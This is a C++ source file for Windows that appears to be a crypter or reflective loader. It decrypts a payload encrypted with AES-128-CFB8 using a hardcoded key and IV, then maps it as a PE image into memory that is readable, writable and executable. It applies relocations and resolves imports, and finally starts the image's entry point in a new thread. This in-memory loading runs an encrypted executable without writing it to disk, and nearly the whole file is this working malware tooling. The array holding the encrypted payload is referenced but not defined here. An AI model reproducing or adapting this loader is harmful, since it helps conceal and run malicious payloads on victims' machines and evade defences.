#include <iostream>
#include <vector>
#include <iomanip>
#include <sstream>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <windows.h>

using namespace std;


void printBytesHex(const vector<unsigned char>& bytes, size_t numBytes) {
    for (size_t i = 0; i < numBytes && i < bytes.size(); ++i) {
        cout << hex << setw(2) << setfill('0') << static_cast<int>(bytes[i]) << " ";
    }
    cout << dec << endl; // Switch back to decimal
}
vector<unsigned char> decrypt(const vector<unsigned char>& buf, const vector<unsigned char>& key, const vector<unsigned char>& iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        cerr << "error creating EVP context\n";
        exit(1);
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cfb8(), NULL, key.data(), iv.data()) != 1) {
        cerr << "error initializing decryption\n";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    vector<unsigned char> plaintext(buf.size());
    int len;

    if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, buf.data(), buf.size()) != 1) {
        cerr << "Error during decryption!" << endl;
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    EVP_CIPHER_CTX_free(ctx);

    return plaintext;
}
void execute(const vector<unsigned char> &payload) {

    // Get DOS and NT Headers from the payload, e_lfanew is the offset start of the exe
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);

    // Validates DOS and NT Headers
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        cerr << "DOS Invalid\n";
        return;
    }
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        cerr << "NT Invalid\n";
        return;
    }

    // Memory allocation for the executable image with execute permissions  
    void* execMemory = VirtualAlloc(
        NULL,
        ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );

    // Checks that the memory allocation was successful
    if (!execMemory) {
        cerr << "VirtualAlloc failed with error code: " << GetLastError() << "\n";
        return;
    }

    // For debugging
    cout << "Memory allocation at: " << execMemory << "\n";

    // Copy the payload headers into a section of the allocated memory
    memcpy(execMemory, payload.data(), ntHeaders->OptionalHeader.SizeOfHeaders);
    cout << "Headers copied\n";

    // Iterates over every section of the binary and copies them into a section of allocated memory
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        void* sectionDest = (void*)((BYTE*)execMemory + section->VirtualAddress);
        void* sectionSrc = (void*)((BYTE*)payload.data() + section->PointerToRawData);
        memcpy(sectionDest, sectionSrc, section->SizeOfRawData);

        cout << "Section " << section->Name << " copied to " << sectionDest << endl;
    }

    // Process Relocations
    // PEs have a preferred base address, which will probably not match the base address returned from VirtualAlloc().
    // Need to make adjustments to the addresses of the sections relative to the new base address returned from
    // VirtualAlloc(), and the original preferred base address of the payload. The first check is to make sure that the image 
    // needs relocations. If no relocation table is present in the binary, no relocations are needed
    /*
    1. Get base relocation table
    2. Iterate over relocation entries
    3. Calculate delta
    4. Adjust addresses 
    */ 
    if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
        PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)execMemory + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (relocation->VirtualAddress > 0) {
            // Diff between base address of VirtualAlloc() and preferred base address 
            uintptr_t delta = (uintptr_t)((BYTE*)execMemory - ntHeaders->OptionalHeader.ImageBase);
            int count = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD relocEntry = (PWORD)((BYTE*)relocation + sizeof(IMAGE_BASE_RELOCATION));
            for (int i = 0; i < count; i++, relocEntry++) {
                if (*relocEntry & 0xF000) { // Check for high nibble (type)
                    // Adjusting the address
                    uintptr_t* patchAddr = (uintptr_t*)((BYTE*)execMemory + relocation->VirtualAddress + (*relocEntry & 0xFFF));
                    *patchAddr += delta;
                }
            }
            relocation = (PIMAGE_BASE_RELOCATION)((BYTE*)relocation + relocation->SizeOfBlock);
        }
    }

    // Process Import Table 
    // Import table allows for PEs to dynamically link functions/data from external DLLs. Addresses to the 
    // functions from the DLLs arent hard coded in the PE, just the name of the DLL and the function needed.
    // The import table entries have the name of the DLL, and pointers to arrays of import address
    // tables and name tables. 
    // Structure: 
    // IDT
    // Contains array of IMAGE_IMPORT_DESCRIPTORs which all correspond to a DLL
    // Each contain a name/relative virtual address of the DLL name, FirstThunk/relative virtual address of 
    // of the IAT, and OriginalFirstThunk/relative virtual address of the INT

    // IAT
    // Array of IMAGE_THUNK_DATAs, each containing an RVA to an IMAGE_IMPORT_BY_NAME, which contains the name
    // of the function
    // INT
    // Array of IMAGE_THUNK_DATAs, initially containing the same RVAs as the INT. After resolution, this
    // will contain the actual addresses of the imported functions  
    /*
    1. Check that import table is present
    2. Retrieve the table, get first entry, and for each entry:
        3. Load the DLL by name, using LoadLibraryA()
    
    
    */
    if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)execMemory + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        while (importDescriptor->Name) { //Iterates over each entry in the IDT

            // Loads the DLL specified in the import table entry, verifies that it was loaded 
            char* moduleName = (char*)((BYTE*)execMemory + importDescriptor->Name);
            HMODULE module = LoadLibraryA(moduleName);
            if (!module) {
                cerr << "Failed to load module: " << moduleName << endl;
                return;
            }
            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)execMemory + importDescriptor->FirstThunk);
            while (thunk->u1.AddressOfData) {
                // Function name from import table 
                PIMAGE_IMPORT_BY_NAME import = (PIMAGE_IMPORT_BY_NAME)((BYTE*)execMemory + thunk->u1.AddressOfData);
                
                // Function address
                FARPROC func = GetProcAddress(module, import->Name);
                if (!func) {
                    cerr << "Failed to get address of function: " << import->Name << endl;
                    return;
                }
                // Set the address in the import table 
                thunk->u1.Function = (uintptr_t)func;
                thunk++;
            }
            importDescriptor++;
        }
    }

    // Get the address of the entry point
    void* entryPoint = (void*)((BYTE*)execMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    cout << "Entry point at: " << entryPoint << endl;

    // Create a new thread that starts execution at the entry point
    HANDLE thread = CreateThread(
        NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL
    );

    if (!thread) {
        cerr << "CreateThread failed with error code: " << GetLastError() << endl;
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return;
    }

    cout << "Thread created, waiting for it to finish\n";

    // Wait for the thread to finish
    WaitForSingleObject(thread, INFINITE);

    // Clean up
    CloseHandle(thread);
    VirtualFree(execMemory, 0, MEM_RELEASE);

    cout << "Execution finished\n";
}


const vector<unsigned char> KEY = { 0x82, 0xff, 0x24, 0x81, 0xf3, 0x61, 0x6a, 0xdb, 0x8d, 0x4b, 0xb2, 0x33, 0x91, 0x53, 0x69, 0x2f };
const vector<unsigned char> IV = { 0xd2, 0x61, 0x51, 0x46, 0x80, 0x3d, 0x8b, 0x9c, 0xc6, 0x9e, 0xeb, 0x77, 0x7d, 0xc7, 0xc3, 0x8f };

int main() {

    vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);

    // for debugging 
    //cout << payload.size() << " bytes\n";
    //printBytesHex(payload, 16);

    //cout << "pre execute";
    //getchar();
    execute(payload);

    return 0;
}